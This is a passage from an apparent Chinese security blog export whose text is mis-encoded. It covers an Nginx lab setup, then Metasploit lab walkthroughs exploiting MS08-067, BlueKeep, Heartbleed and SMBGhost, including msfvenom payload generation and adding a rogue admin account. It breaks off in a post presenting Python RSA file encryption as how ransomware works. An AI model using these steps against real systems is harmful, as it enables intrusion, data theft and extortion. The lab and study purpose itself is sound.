}\n}\n```\n\nåˆ›å»ºHTMLèµ„æºæ–‡ä»¶\n\n```bash\nmkdir /web\n```\n\nç¼–è¾‘ç½‘é¡µå…¥å£æ–‡ä»¶\n\n```bash\ntouch /web/index.html\necho \"web1111\" > /web/index.html\n```\n\nå¼€å¯NginxæœåŠ¡\n\n```bash\nnginx\n```\n\néªŒè¯æœåŠ¡å¼€å¯\n\n```bash\nlsof -i:80\n```\n\n### WEB2é…ç½®\n\nweb2é…ç½®åŸºæœ¬åŒweb1ã€‚\n\nä½¿ç”¨å‘½ä»¤å»æ‰Nginxé…ç½®æ–‡ä»¶çš„ç©ºè¡Œå’Œæ³¨é‡Šè¡Œ\n\n```bash\negrep -v \"^[[:space:]]*#|^$\" nginx.conf.default > nginx.conf\n```\n\nä¿®æ”¹é…ç½®æ–‡ä»¶\n\n```bash\nworker_processes  1;\nevents {\n    worker_connections  1024;\n}\nhttp {\n    include       mime.types;\n    default_type  application/octet-stream;\n    sendfile        on;\n    keepalive_timeout  65;\n    server {\n        listen       80;\n        server_name  172.21.8.30;\n        location / {\n            root   /web;\n            index  index.html index.htm;\n        }\n        error_page   500 502 503 504  /50x.html;\n        location = /50x.html {\n            root   html;\n        }\n    }\n}\n```\n\nåˆ›å»ºHTMLèµ„æºæ–‡ä»¶\n\n```bash\nmkdir /web\n```\n\nç¼–è¾‘ç½‘é¡µå…¥å£æ–‡ä»¶\n\n```bash\ntouch /web/index.html\necho \"web2222\" > /web/index.html\n```\n\nå¼€å¯NginxæœåŠ¡\n\n```bash\nnginx\n```\n\néªŒè¯æœåŠ¡å¼€å¯\n\n```bash\nlsof -i:80\n```\n\n### æµ‹è¯•\n\nå…ˆåœ¨web1ä¸»æœº\n\n```bash\ncurl 172.21.8.20\n```\n\nç„¶ååœ¨web2ä¸»æœº\n\n```bash\ncurl 172.21.8.30\n```\n\næœ€ååœ¨DSä¸»æœºä¸Š\n\n```bash\ncurl 192.168.20.40\n```\n\nå¦‚æœè§‚å¯Ÿåˆ°```web1111```å’Œ```web2222```æ¥å›æ˜¾ç¤ºåœ¨é¡µé¢ä¸Šåˆ™é…ç½®æˆåŠŸã€‚\n\n### å…¶ä»–å¯èƒ½ç”¨åˆ°çš„å‘½ä»¤\n\nLinuxæŸ¥çœ‹è·¯ç”±è¡¨\n\n```bash\nip r s\n```\n\né‡å¯Nginxçš„å‘½ä»¤\n\n```bash\nnginx -s reload\n```\n\nå…³é—­Nginxçš„å‘½ä»¤\n\n```bash\nnginx -s stop\n```","tags":["Linux"],"categories":["æŠ€æœ¯"]},{"title":"CVEæ¼æ´æˆåŠŸå¤ç°çš„ç„å­¦æ¡ä»¶","url":"/2023/05/07/CVE-extend/","content":"\n### æ­£æ–‡\n\næ€»ç»“ä¸€ä¸‹æ¼æ´å¤ç°å¾—å‡ºæ¥çš„å‡ ç‚¹ä½“ä¼šï¼Œä¹‹å‰åœ¨æ°¸æ’ä¹‹é»‘æ–‡ç« é‡Œå°±å·²ç»æè¿‡å‡ æ¬¡äº†ã€‚\n\nä½†è¿˜æ˜¯æœ‰ä¸¤ç‚¹å¾—è¡¥å……ä¸€ä¸‹\n\n<!-- more -->\n\n1. åœ¨è¢«kaliæ”»å‡»è¿‡ä¸€æ¬¡ä¹‹åï¼Œå€˜è‹¥æ²¡æœ‰æ‹¿åˆ°meterpreterï¼Œè¿™ä¸ªæ—¶å€™ä¸€èˆ¬ç¬¬äºŒæ¬¡ä¹Ÿä¸ä¼šæˆåŠŸçš„ï¼Œå³ä¾¿ä½ æ‰€æœ‰çš„æ“çºµéƒ½æ˜¯å¯¹çš„ã€‚è¿™ä¸ªæ—¶å€™ä¸€å®šè¦é‡å¯é¶æœºçš„ç³»ç»Ÿã€‚\n\n2. è®¾ç½®æ”»å‡»å‚æ•°çš„æ—¶å€™ï¼Œä¸€å®šè¦çœ‹å¥½å‚æ•°ï¼Œå°¤å…¶æ˜¯ç³»ç»Ÿå­˜åœ¨ä¸¤ä¸ªç½‘å¡çš„ï¼Œä¸€å®šè¦çœ‹æ”»å‡»æœºçš„IPæ˜¯ä¸æ˜¯å’Œé¶æœºçš„IPåœ¨åŒä¸€ä¸ªç½‘æ®µçš„ã€‚","tags":["ç½‘ç»œå®‰å…¨"],"categories":["æŠ€æœ¯"]},{"title":"è¿œç¨‹å‘½ä»¤æ‰§è¡Œï¼ˆms08-067ï¼‰ï¼ˆCVE-2008-4250ï¼‰","url":"/2023/04/23/ms08-067/","content":"\n### å‡†å¤‡å·¥ä½œ\n\næ”»å‡»æœºï¼škaliï¼Œå·®ä¸å¤šçš„ç‰ˆæœ¬éƒ½å¯ä»¥ï¼Œæˆ‘ç”¨çš„æ˜¯Linux kali 6.1.0-kali5-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.12-1kali2 (2023-02-23) x86_64 GNU/Linuxï¼Œå¯ä»¥ä½¿ç”¨å‘½ä»¤```uname -a```æŸ¥çœ‹ã€‚\n\né¶æœºï¼šXP windowsï¼Œä¸‹è½½é“¾æ¥ï¼Œæ¨èä½¿ç”¨ç”µè„‘ç‰ˆçš„è…¾è®¯å¾®äº‘ä¸‹è½½ï¼Œè¿™æ˜¯ç›®å‰æˆ‘æ‰¾åˆ°çš„æœ€å¥½ç”¨çš„ed2kçš„ä¸‹è½½å·¥å…·äº†ã€‚\n\n<!-- more -->\n\n```\ned2k://|file|sc_winxp_tablet_2005_CD1.iso|629227520|505B810E128351482AF8B83AC4D04FD2|/\n```\n\n### åŸŸå†…æ‰«æ\n\næ”»å‡»ç¬¬ä¸€æ­¥ï¼Œå…ˆæ‰«æç½‘ç»œå†…å­˜æ´»å¹¶å¯ä»¥åˆ©ç”¨çš„ä¸»æœºã€‚\n\n```\nnmap -T4 -A -v -Pn 192.168.20.1/24\n```\n\n### å¼€å§‹æ”»å‡»\n\n1. æ‰§è¡Œ```msfconsole -q```ã€‚\n2. æœç´¢```ms08-067```ã€‚\n\n![å¼€å¯å·¥å…·](./ms08-067/1.png)\n\n3. è®¾ç½®æ”»å‡»å‰å¿…è¦çš„å‚æ•°ã€‚ä»ä¸Šå›¾çœ‹åˆ°ï¼Œåªæœ‰ä¸€ä¸ªå¯ç”¨çš„æ¨¡å—ã€‚æˆ‘ä»¬å°±ä½¿ç”¨è¿™ä¸ªæ¨¡å—ã€‚ç„¶åå¯ä»¥ä½¿ç”¨```show options```å…ˆæŸ¥çœ‹éƒ½éœ€è¦è®©æˆ‘ä»¬è®¾ç½®å“ªäº›å‚æ•°ã€‚\n\n![ä½¿ç”¨æ¨¡å—](./ms08-067/2.png)\n\n4. è®¾ç½®å‚æ•°ã€‚ä¸Šå›¾çœ‹åˆ°ï¼Œæˆ‘ä»¬éœ€è¦è®¾ç½®```rhosts```ï¼ˆé¶æœºIPï¼‰ã€‚\n\n![è®¾ç½®å‚æ•°](./ms08-067/3.png)\n\n5. ç„¶åè®¾ç½®payload reverse_tcp\n\n![è®¾ç½®å‚æ•°](./ms08-067/4.png)\n\n6. æœ€åè®¾ç½®é¶æœºçš„ç±»å‹ï¼Œåœ¨è¿™æˆ‘é€‰æ‹©34ã€‚\n\n![è®¾ç½®å‚æ•°](./ms08-067/5.png)\n\n7. è®¾ç½®å¥½å°±å¯ä»¥å¼€å§‹æ”»å‡»äº†ã€‚\n\n![è®¾ç½®å‚æ•°](./ms08-067/6.png)\n\næœ€åè¿”å›meterpreterï¼Œæ”»å‡»æˆåŠŸã€‚","tags":["ç½‘ç»œå®‰å…¨"],"categories":["æŠ€æœ¯"]},{"title":"è¿œç¨‹æ¡Œé¢ææƒï¼ˆCVE-2019-0708ï¼‰","url":"/2023/04/22/CVE-2019-0708/","content":"\n### å‡†å¤‡å·¥ä½œ\n\né¦–å…ˆéœ€è¦å‡†å¤‡ä¸¤å°è™šæ‹Ÿæœºï¼Œä¸€å°è¿è¡Œkali linuxï¼Œå¦ä¸€å°è¿è¡Œçš„æ˜¯windows7ï¼Œç›®æ ‡æœºå¼€å¯3389ç«¯å£,å…³é—­é˜²ç«å¢™ï¼Œåœ¨è®¡ç®—æœºé«˜çº§ç³»ç»Ÿè®¾ç½®ä¸­è¿œç¨‹æ¡Œé¢è®¾ç½®å…è®¸ã€‚\n\n### å¼€å§‹æ”»å‡»\n\n1. è¿˜æ˜¯ä½¿ç”¨æˆ‘ä»¬ç†Ÿæ‚‰çš„```msfconsole```å·¥å…·,è¿›å…¥ä¹‹åæœç´¢***0708***ã€‚\n\n<!-- more -->\n\n![å¯åŠ¨å·¥å…·](./CVE-2019-0708/1.png)\n\n2. ä½¿ç”¨ç¼–å·æ˜¯1çš„æ¨¡å—ï¼Œç„¶åè®¾ç½®***payload***ï¼Œè¿™æ˜¯ä¸ºäº†æ”»å‡»æˆåŠŸä¹‹åä¸ä¼šè“å±ï¼Œè€Œæ˜¯ç»™æˆ‘ä»¬å¼¹å›ä¸€ä¸ª```shell```ã€‚ä½¿ç”¨```options```æŸ¥çœ‹éœ€è¦è®¾ç½®çš„å‚æ•°ï¼Œä»å›¾ä¸­å¯ä»¥çœ‹åˆ°éœ€è¦è®¾ç½®ç›®æ ‡æœºå™¨çš„IPã€‚\n\n![å¯åŠ¨å·¥å…·](./CVE-2019-0708/2.png)\n\n3. æˆ‘ä»¬éœ€è¦é¢å¤–è®¾ç½®ä¸€ä¸ªå‚æ•°```targets```ã€‚ä½¿ç”¨```show targets```æŸ¥çœ‹é€‰é¡¹ï¼Œé€‰æ‹©æœ€è´´åˆæˆ‘ä»¬æƒ…å†µçš„ï¼Œæˆ‘é€‰æ‹©äº†windowsçš„VMwareã€‚\n\n![å¯åŠ¨å·¥å…·](./CVE-2019-0708/3.png)\n\n4. è®¾ç½®å®Œå°±å¯ä»¥runèµ·æ¥äº†ï¼Œç¨ä½œç­‰å¾…ï¼ŒæˆåŠŸè¿”å›```shell```,éªŒè¯ä¸€ä¸‹æˆ‘ä»¬çš„æƒé™ï¼Œæ˜¯ç³»ç»Ÿç”¨æˆ·æ²¡æœ‰é”™ã€‚\n\n![å¯åŠ¨å·¥å…·](./CVE-2019-0708/4.png)\n\n5. æˆ‘ä»¬å°è¯•åœ¨ç³»ç»Ÿä¸­æ·»åŠ ä¸€ä¸ªç”¨æˆ·***hacker***ï¼Œå¯†ç è®¾ç½®ä¸ºâ€œ1234â€ã€‚\n\n![å¯åŠ¨å·¥å…·](./CVE-2019-0708/5.png)\n\n6. ç„¶åæŠŠ***hacker***æ·»åŠ åˆ°ç®¡ç†å‘˜ç»„ã€‚\n\n![å¯åŠ¨å·¥å…·](./CVE-2019-0708/6.png)\n\n7. å†å¯åŠ¨ä¸€ä¸ªç»ˆç«¯ï¼Œè¾“å…¥```rdesktop 192.168.20.130```ï¼Œè¿™é‡Œè·Ÿç€çš„æ˜¯ç›®æ ‡æœºå™¨çš„IPã€‚ç„¶åkaliä¼šå¼¹å‡ºä¸€ä¸ªæ–°é¡µé¢ï¼Œå°±æ˜¯windowsçš„ç™»å½•é¡µé¢ï¼Œæˆ‘ä»¬ä½¿ç”¨åˆšåˆšåˆ›å»ºçš„ç”¨æˆ·å’Œå¯†ç ç™»å½•ã€‚\n\n![å¯åŠ¨å·¥å…·](./CVE-2019-0708/7.png)\n\n8. æœ€åkaliæˆåŠŸè¿œç¨‹ç™»å½•windowsï¼Œä»»åŠ¡å®Œæˆã€‚\n\n![å¯åŠ¨å·¥å…·](./CVE-2019-0708/8.png)","tags":["ç½‘ç»œå®‰å…¨"],"categories":["æŠ€æœ¯"]},{"title":"å¿ƒè„æ»´è¡€åŸç†ä¸å¤ç°","url":"/2023/04/22/heartbleed/","content":"\n### å‰æœŸå‡†å¤‡\n\næ”»å‡»æœºå™¨è¿˜æ˜¯kaliï¼Œé¶æœºè¿™é‡Œç”¨åˆ°çš„æ˜¯[beebox](https://sourceforge.net/projects/bwapp/files/bee-box/)ï¼Œä¸‹è½½å®Œä¹‹åè§£å‹å¯¼å…¥è™šæ‹Ÿæœºå°±å¯ä»¥å¼€å§‹ä½¿ç”¨äº†ã€‚\n\n### nmapæ‰«æ\n\næ”»å‡»å‘èµ·å‰ï¼Œè‚¯å®šæ˜¯kaliå…ˆè¿›è¡Œæ‰«æï¼ŒæŸ¥çœ‹åŒä¸€ç½‘æ®µå“ªäº›æœºå™¨åœ¨çº¿ã€‚\n\n<!-- more -->\n\n```bash\n  nmap -T4 -A -v -Pn 192.168.20.1/24\n```\n\næ‰«æå®Œæˆåå‘ç°æœ‰ä¸€å°192.168.20.136çš„æœºå™¨åœ¨çº¿ï¼Œå¤ç°å¿ƒè„æ»´è¡€ç”¨åˆ°çš„ç«¯å£æ˜¯8443ã€‚\n\n![æ‰«æç»“æœ](./heartbleed/1.png)\n\n### è„šæœ¬æ¢æµ‹\n\nçœ‹åˆ°æœºå™¨åœ¨çº¿åï¼Œä½¿ç”¨ä¸€ä¸ªå·¥å…·æ¢æµ‹å…¶8443ç«¯å£æ˜¯å¦å¯ä»¥åˆ©ç”¨ï¼ŒæŸ¥çœ‹é¶æœºæ˜¯å¦æœ‰å¯ä»¥åˆ©ç”¨çš„æœºä¼šã€‚\n\n```bash\n  nmap 192.168.20.136 -p 8443 --script ssl-heartbleed.nse\n```\n\næ–‡å­—æ˜¾ç¤ºæ˜¯â€œVULNERABLEâ€ï¼Œä»£è¡¨æ¼æ´å¯ä»¥è¢«åˆ©ç”¨ã€‚\n\n![è„šæœ¬æ¢æµ‹](./heartbleed/2.png)\n\n### å¼€å§‹æ”»å‡»\n\næ‰“å¼€```msfconsole```å·¥å…·ï¼Œæœç´¢```heartbleed```ï¼Œä½¿ç”¨1ã€‚\n\n```bash\n  msfconsole -q\n  search heartbleed\n  use 1\n```\n\n![å‚æ•°è®¾ç½®](./heartbleed/4.png)\n\nä½¿ç”¨```show options```æŸ¥çœ‹ç›¸åº”çš„å‚æ•°å¹¶è®¾ç½®ï¼ŒåŒ…æ‹¬```rport```ï¼Œ```rhost```ï¼Œ```verbose```ã€‚\n\n```bash\n  set rport 8443\n  set rhost 192.168.20.136\n```\n\n![å‚æ•°è®¾ç½®](./heartbleed/5.png)\n\n![å‚æ•°è®¾ç½®](./heartbleed/8.png)\n\nå…¶ä¸­```verbose```æ˜¯è¦åœ¨```show advanced```ä¸‹æŸ¥çœ‹çš„ï¼Œé»˜è®¤æ˜¯```false```ï¼Œæˆ‘ä»¬```set verpose true```è®¾ç½®ä¸º```true ```ï¼Œåªæœ‰è¿™æ ·æˆ‘ä»¬æ‰èƒ½æ˜æ–‡æ˜¾ç¤ºï¼ˆç»ˆç«¯æ˜¾ç¤ºï¼‰æˆ‘ä»¬æ‹¿åˆ°çš„64Kçš„æ•°æ®ã€‚\n\n```bash\n  show advanced\n  set verbose true\n```\n\n![å‚æ•°è®¾ç½®](./heartbleed/3.png)\n\næœ€åå¯ä»¥ç”¨```show missing```æŸ¥çœ‹é—æ¼çš„è®¾ç½®å‚æ•°ï¼Œæ²¡æœ‰é—æ¼ï¼Œå°±å¯ä»¥å¼€å§‹è¿è¡Œäº†ã€‚\n\n```bash\n  show missing\n  run\n```\n\n![å‚æ•°è®¾ç½®](./heartbleed/6.png)\n\nkaliåœ¨è¿™è¾¹è¿è¡Œç€ï¼Œç„¶åå›åˆ°é¶æœºä¸Šéšä¾¿ç‚¹ç‚¹ç‚¹ï¼Œåªè¦å‘ç”Ÿæ“ä½œï¼Œå°±ä¼šæœ‰æ•°æ®å¤–æ³„ã€‚\n\n![å‚æ•°è®¾ç½®](./heartbleed/9.png)\n\næœ€åæˆ‘ä»¬å›åˆ°kaliï¼Œå‘ç°å·²ç»æ‹¿åˆ°æ•°æ®äº†ã€‚\n\n![å‚æ•°è®¾ç½®](./heartbleed/7.png)\n\nå¿ƒè„æ»´è¡€çš„å¤ç°åˆ°è¿™é‡Œå°±å®Œæˆäº†ã€‚","tags":["ç½‘ç»œå®‰å…¨"],"categories":["æŠ€æœ¯"]},{"title":"æ°¸æ’ä¹‹é»‘ï¼ˆCVE-2020-0796ï¼‰","url":"/2023/04/21/CVE-2020-0796/","content":"\n### æƒ­æ„§å£°æ˜\nç¨å¾®äº†è§£ä¸€ç‚¹å°±ä¼šçŸ¥é“ï¼ŒCVE-2020-0796æ˜¯å¯ä»¥æ‹¿åˆ°shellçš„ï¼Œä½†æ˜¯å› ä¸ºæŠ€æœ¯èƒ½åŠ›çš„é™åˆ¶ï¼Œåˆ°ç°åœ¨å¤ç°bugæˆ‘ä¹Ÿæ²¡æœ‰æ‹¿åˆ°shellï¼Œåªä¼šè®©é¶æœºè“å±é‡å¯ã€‚å…ˆæŠŠåšå®¢æ›´äº†ï¼Œç­‰åç»­ææ˜ç™½äº†ï¼Œå†æ¥æ›´æ–°ã€‚\n\n### å‡†å¤‡å·¥ä½œ\n\né¦–å…ˆï¼Œå‡†å¤‡ä¸€å°kaliå’Œä¸€å°è¿è¡Œ1903ç‰ˆæœ¬æˆ–è€…1909ç‰ˆæœ¬çš„windows10ã€‚\n\n<!-- more -->\n\nå…³é—­windows10çš„é˜²ç«å¢™å’Œå®æ—¶ä¿æŠ¤åŠŸèƒ½ã€‚\n\nåœ¨kaliä¸Šå‡†å¤‡å¾…ä¼šè¦ç”¨åˆ°çš„å·¥å…·ã€‚\n\n1. å¯ç”¨æ‰«æè„šæœ¬\n\n```git\nÂ  git clone https://github.com/ollypwn/SMBGhost.git\n```\n\næœ‰äººè¯´è¿™ä¸ªè„šæœ¬ä¸å‡†ç¡®ï¼Œæœ‰æ—¶å€™æ£€æµ‹è¶…æ—¶ä¹Ÿä¼šæŠ¥bugå¯åˆ©ç”¨ï¼Œè¿™ä¸ªè„šæœ¬ä¹Ÿä¸å¤ªé‡è¦ï¼Œè‡³å°‘å¯¹äºè¿™ä¸ªå®éªŒæ¥è¯´ã€‚\n\n2. ä¸‹è½½EXPè„šæœ¬\n\n```git\nÂ  git clone https://github.com/chompie1337/SMBGhost_RCE_PoC.git\n```\n\n### æ‰«æbug\n\nå‡†å¤‡å¥½æ‰«æè„šæœ¬åè¿›å…¥è¯¥ç›®å½•ï¼Œæ‰§è¡Œï¼š\n\n```python\nÂ  python3 scanner.py 192.168.20.135\n```\n\n\"192.168.20.135\"æ›´æ¢ä¸ºè‡ªå·±é¶æœºçš„IPã€‚ä¸‹é¢æ˜¯æ•ˆæœå›¾ï¼Œæ˜¾ç¤º\"Vulnerable\"ï¼Œæ˜“å—æ”»å‡»çš„ã€‚\n\n![bugæ‰«æ](./CVE-2020-0796/1.png)\n\n### å‡†å¤‡payload\n\nè¿›å…¥ä½¿ç”¨EXPè„šæœ¬çš„SMBGhost_RCE_PoCç›®å½•ï¼Œæ‰§è¡Œï¼š\n\n```bash\nÂ  msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=4444 -f py -o payload\n```\n\næ‰§è¡Œä¹‹åä¼šåœ¨SMBGhost_RCE_PoCç›®å½•ä¸‹ç”Ÿæˆpayloadæ–‡ä»¶ã€‚æ¥ä¸‹æ¥å¾ˆé‡è¦çš„æ­¥éª¤ï¼š\n\n1. æ‰“å¼€payloadã€‚\n\n2. æ‰“å¼€exploit.pyã€‚\n\n3. å°†payloadä¸­â€œbufâ€å­—æ®µå…¨éƒ¨æ›¿æ¢ä¸ºâ€œUSER_PAYLOADâ€å­—æ®µã€‚\n\n4. å¤åˆ¶æ›¿æ¢å®Œæˆçš„payloadæ–‡ä»¶å†…å®¹ã€‚\n\n5. ç²˜è´´åˆ°ï¼ˆè¦†ç›–ï¼‰exploit.pyæ–‡ä»¶USER_PAYLOADåŒºåŸŸã€‚\n\n![ä¿®æ”¹payload](./CVE-2020-0796/2.png)\n\n### å¼€å§‹æ”»å‡»\n\n1. å¯åŠ¨```msfconsole```ã€‚\n\n2. ä½¿ç”¨æ¨¡å—ã€‚\n\n3. è®¾ç½®æœ‰æ•ˆè½½è·å’Œç›¸å…³å‚æ•°ã€‚\n\nä¾æ¬¡æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼š\n\n```bash\n  msfconsole -q\n  use exploit/multi/handler\n  set payload windows/x64/meterpreter/bind_tcp\n  set lport 4444\n  set rhost 192.168.20.135\n  run\n```\n\n![æ”»å‡»](./CVE-2020-0796/3.png)\n\nå†æ‰“å¼€ä¸€ä¸ªç»ˆç«¯ï¼Œè¿›å…¥SMBGhost_RCE_PoCç›®å½•ï¼Œè¿è¡Œï¼š\n\n```bash\n  python3 exploit.py -ip 192.168.20.135\n```\n\n![è¿è¡Œ exploit.py](./CVE-2020-0796/4.png)\n\nå‡ºç°è¿™æ­¥åæŒ‰ä¸‹å›è½¦ã€‚\n\nç„¶åå›åˆ°win10ï¼Œå‘ç°win10è“å±æ­£åœ¨é‡å¯ã€‚\n\n![win10é‡å¯](./CVE-2020-0796/5.png)\n\nå¦‚æœå®Œæˆçš„å½»åº•ï¼Œ```msfconsole```ç»ˆç«¯ä¼šå¼¹å‡ºmeterpreterï¼Œä½†æ˜¯å¾ˆé—æ†¾ï¼Œæˆ‘æ²¡æœ‰æ‹¿åˆ°é¶æœºçš„shellã€‚\n\n![æ‹¿åˆ°shell](./CVE-2020-0796/6.png)\n\n---\n\næ‰‹åŠ¨åˆ†å‰²çº¿\n\n---\n\n### ç„å­¦æ’é”™\n\næ¥ç€ä¸Šæ¬¡çš„æ¥è¯´ï¼Œä¸Šæ¬¡æ˜¯æ²¡æœ‰æ‹¿åˆ°shellçš„ã€‚ç»è¿‡ä¸€äº›ç½‘ä¸Šæ‹é”™å’Œåˆ«çš„åŒå­¦çš„äº¤æµï¼Œå¾—åˆ°äº†ä¸€äº›å¯å‘ï¼Œæœ€ç»ˆæˆåŠŸæ‹¿åˆ°äº†shellã€‚å…¶ä¸­æœ‰å¾ˆå¤šé—®é¢˜ä¹Ÿæ˜¯å¾ˆç„å­¦çš„ã€‚\n\n1. æŠŠé¶æœºçš„å†…å­˜è®¾ç½®å¤§ä¸€ç‚¹ï¼Œæˆ‘ç›´æ¥ç»™åˆ°äº†8Gã€‚\n\n2. kaliå’Œé¶æœºçš„è¿é€šæœ€å¥½ä¸è¦ä½¿ç”¨NATè¿æ¥ï¼Œå¦‚æœä½¿ç”¨NATè¿æ¥ï¼Œå»ºè®®æŠŠå®¿ä¸»æœºçš„é˜²ç«å¢™å’Œç—…æ¯’ä¿æŠ¤ä¹Ÿå…³é—­ã€‚\n\n3. åœ¨é¶æœºä¸­è¦åœ¨æ§åˆ¶é¢æ¿-ç¨‹åº-å¯ç”¨æˆ–å…³é—­windowsçš„åŠŸèƒ½-æ‰“å¼€SMBå¼€å…³ï¼Œç„¶åé‡å¯ã€‚\n\n4. åœ¨è¿›è¡Œpaylod-codeç”Ÿæˆçš„æ—¶å€™ï¼Œå°½é‡ä¸è¦ä½¿ç”¨åŸæœ‰çš„4444ç«¯å£ï¼ˆæˆ‘ç”¨çš„9876ï¼‰ã€‚\n\n5. æ›´æ¢äº†windowsçš„é•œåƒï¼Œé‡æ–°å®‰è£…äº†ä¸€ä¸ªè™šæ‹Ÿæœºï¼Œé•œåƒä¿å­˜åœ¨äº†[ç™¾åº¦äº‘ç›˜](https://pan.baidu.com/s/1M1GvWoMcJc5nZA_tS4tang)é‡Œï¼Œæå–ç ï¼š0731ã€‚\n\n### æˆåŠŸçš„å°è¯•\n\nç”Ÿæˆpayload-codeã€‚\n\n![](./CVE-2020-0796/9.png)\n\nç„¶åæ›¿æ¢exploit.pyæ–‡ä»¶ä¸­user_payloadå­—æ®µã€‚\n\n![](./CVE-2020-0796/10.png)\n\nå‰é¢çš„æ“ä½œè¿˜æ˜¯ä¸€æ ·ï¼Œè¿›å…¥å·¥å…·ï¼Œä½¿ç”¨æ¨¡å—ï¼Œè®¾ç½®payloadã€‚\n\n![](./CVE-2020-0796/7.png)\n\nè®¾ç½®æ”»å‡»å‚æ•°ã€‚\n\n![](./CVE-2020-0796/8.png)\n\næ‰§è¡Œrunå‘½ä»¤å¹¶åœ¨æ­¤ç­‰å€™ã€‚\n\n![](./CVE-2020-0796/11.png)\n\nç„¶åå†å¼€ä¸€ä¸ªç»ˆç«¯\n\n![](./CVE-2020-0796/12.png)\n\næˆåŠŸæ‹¿åˆ°shellï¼Œæ˜¯ç®¡ç†å‘˜çš„æƒé™æ²¡æœ‰é”™ã€‚\n\n![](./CVE-2020-0796/13.png)","tags":["ç½‘ç»œå®‰å…¨"],"categories":["æŠ€æœ¯"]},{"title":"ä½¿ç”¨PythonåŠ å¯†æ–‡ä»¶","url":"/2023/04/17/Python-encrypted-file/","content":"\n### åŠŸèƒ½\n\nç”¨Pythonå®ç°å¯¹æ–‡ä»¶çš„åŠ å¯†å’Œè§£å¯†ï¼Œå³ransomwareçš„ä»£ç åŸç†å®ç°ã€‚\n\n### åº\n\nå¦‚æœä½ æ˜¯ç›´æ¥copyçš„ä»£ç å—ï¼Œç²˜è´´åˆ°pycharmåï¼Œä½ ä¼šçœ‹åˆ°.pyæ–‡ä»¶ä¼šæœ‰ä¸€äº›å¯¼å…¥åŒ…çš„æŠ¥é”™ã€‚ä½ å¯ä»¥è‡ªå·±å»ç½‘ä¸Šæ‰¾æ•™ç¨‹è¿›è¡Œä¸‹è½½ã€‚<!-- more -->æ¯”å¦‚[è¿™ä¸ª](https://blog.csdn.net/yilovexing/article/details/104011199)ï¼Œä¹Ÿå¯ä»¥ä¸‹è½½[æˆ‘æä¾›çš„æ–‡ä»¶](https://www.aliyundrive.com/s/HcrQHfdUYMi)ï¼Œç„¶åæŠŠä¸‹è½½ä¸¤ä¸ªæ–‡ä»¶å¤¹å¤åˆ¶åˆ°Pythonç¯å¢ƒçš„`F:\\Python\\Lib\\site-packages\\`æ–‡ä»¶å¤¹ä¸‹é¢ï¼ˆæˆ‘çš„Pythonå®‰è£…åœ¨Fç›˜ï¼Œæ‰¾åˆ°ä½ è‡ªå·±çš„å®‰è£…è·¯å¾„ï¼‰ï¼Œè¿™ä¸ªæ–‡ä»¶å¤¹ä¿å­˜äº†ä¸€äº›Pythonå¯¼çš„åŒ…ã€‚å¦‚æœæ˜¯è‡ªå·±ä¸‹è½½çš„ï¼Œä¸‹è½½å®Œä¹‹åè¿˜æ˜¯æŠ¥é”™ï¼Œä¹Ÿå¯ä»¥åˆ°è¿™ä¸ªæ–‡ä»¶å¤¹ä¸‹ï¼Œæ£€æŸ¥ä¸€ä¸‹Pythonä¸­å¯¼åŒ…æ—¶from XXXå’Œä¸‹è½½åˆ°è¿™ä¸ªæ–‡ä»¶å¤¹çš„åŒ…å‘½å¤§å°å†™æ˜¯å¦ä¸€è‡´ã€‚å†æœ‰åˆ«çš„é—®é¢˜ï¼Œä¹Ÿåªèƒ½ä½ è‡ªå·±å»æ¢ç´¢äº†ã€‚æˆ‘ç™¾åˆ†ä¹‹ç™¾ç¡®å®šï¼Œè¿™ä¸ªä»£ç æ˜¯å¯ä»¥è¿è¡ŒæˆåŠŸçš„ã€‚æˆ‘ç”¨çš„Pythonç‰ˆæœ¬æ˜¯3.11.2ã€‚\n\n### ç§˜é’¥ç”Ÿæˆ\n\nå‡†å¤‡å¥½ç¯å¢ƒä¹‹åï¼Œé‚£ä¹ˆæˆ‘ä»¬ç°åœ¨æ¥å¼€å§‹æ¨¡æ‹Ÿhackerå¯¹æ–‡ä»¶è¿›è¡ŒåŠ å¯†å¤„ç†å§ï¼ï¼\n\nå¦‚æœå‰é¢æœ‰äº†è§£RSAç®—æ³•çš„è¯ï¼Œé‚£ä¹ˆè‚¯å®šçŸ¥é“ï¼Œæˆ‘ä»¬ç¬¬ä¸€æ­¥å°±æ˜¯è¦ç”Ÿæˆå…¬é’¥å’Œç§é’¥ï¼Œç”¨å…¬é’¥å¯¹æ–‡ä»¶è¿›è¡ŒåŠ å¯†ï¼Œç”¨ç§é’¥å¯¹æ–‡ä»¶è¿›è¡Œè§£å¯†ã€‚\n\n```python\nfrom Crypto.PublicKey import RSA\n\n\ndef CreateRSAKeys():\n    code = 'nooneknows'\n    # ç”Ÿæˆ 2048 ä½çš„ RSA å¯†é’¥\n    key = RSA.generate(2048)\n    encrypted_key = key.exportKey(passphrase=code, pkcs=8, protection=\"scryptAndAES128-CBC\")\n    # ç”Ÿæˆç§é’¥\n    with open('zmy_rsa', 'wb') as f:\n        f.write(encrypted_key)\n    # ç”Ÿæˆå…¬é’¥\n    with open('zmy_rsa.pub', 'wb') as f:\n        f.write(key.publickey().exportKey())\n\n\nCreateRSAKeys()\n\n```\n\nå½“æˆ‘ä»¬æ‰§è¡ŒCreateRSAKeys()åï¼Œä¼šåœ¨å½“å‰ç›®å½•ç”Ÿæˆå…¬é’¥å’Œç§é’¥ï¼Œæˆ‘ä»¬æ‰“å¼€çœ‹çœ‹ã€‚\n\nå…¬é’¥ï¼š\n\n```bash\n-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0j/abkXy6WLfwkacyKK3\n40Sk0dQkODmb6ej5sffzkfgSDOd18drt6vWuqzcH0dtBHcbr8a35K8mLr9WwdKYC\nhDj/dMQm+lOApmLmGeSwjoFB5Nj/tboBPRvPO0erxzS0jrtMdM6KbWjQMc4dkuuq\nIc/L6/Yp5l2mq3K3rdbkbZ8cKvJb5HCUeNiwNZQMTdxFd0R0qmVzezJdunFQAOiP\nG8Knod/Z1ZghETOEuM2OPXxlRs0KA9OQhMFRS6UmCRRNv29/srT/+M307W0U9GJL\n3Eobz6HqTlvl0g54Y9Dg84UO2t2VRgAZ3mlQa+bARyboOQwWpt3VZ7y44KqTwj90\nUQIDAQAB\n-----END PUBLIC KEY-----\n```\n\nç§é’¥ï¼š\n\n```bash\n-----BEGIN ENCRYPTED PRIVATE 